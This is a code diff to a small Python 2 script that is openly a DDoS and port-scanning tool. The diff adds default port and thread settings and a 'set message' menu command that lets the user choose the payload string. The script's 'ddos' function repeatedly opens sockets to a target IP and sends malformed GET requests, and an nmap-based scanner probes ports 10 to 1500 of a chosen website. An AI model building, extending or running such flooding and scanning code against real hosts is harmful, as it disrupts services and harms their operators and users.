@@ -3,6 +3,10 @@ from threading import Thread
 import os
 import nmap
 
+port = 80
+message = 'hello its me'
+threads = 10
+
 def scann(ifconfig):
    nm = nmap.PortScanner()
    nm.scan(ifconfig, '10-1500')
@@ -16,8 +20,8 @@ def ddos():
       try:
           print("\033[1;32;40mSuccess!")
           mysocket.connect((ip, port))
-          mysocket.send(str.encode("GET " + "haste mal 3 fufzig" + "HTTP/1.1 \r\n"))
-          mysocket.sendto(str.encode("GET " + "haste mal 3 fufzig" + "HTTP/1.1 \r\n"), (ip, port))
+          mysocket.send(str.encode("GET " + message + "HTTP/1.1 \r\n"))
+          mysocket.sendto(str.encode("GET " + message + "HTTP/1.1 \r\n"), (ip, port))
       except socket.error:
          print("\033[1;31;40merror")
          mysocket.close()
@@ -58,6 +62,7 @@ while i < 6:
     set port    = Set the port (set port) (Best=80)
     set threads = Set the number of threads (set threads) (Best=8) (=!Not working yet!)
     set ip      = Set the ip (set ip)
+    set message = Set message (set message)
     get ip      = Get ip of website (get ip).  
     get ip      = Get ip of website (get ip).
     get port i  = Get port of ip (get port i)
@@ -111,7 +116,10 @@ while i < 6:
       psw = raw_input("\033[1;32;40mWebsite: ")
       psww = socket.gethostbyname(psw)
       scann(psww)
-      
+   elif com == 'set message':
+      print(" ")
+      message = raw_input("\033[1;32;40mMessage: ")
+      print(" ")
    else:
       print("""\033[1;32;40m
       Error
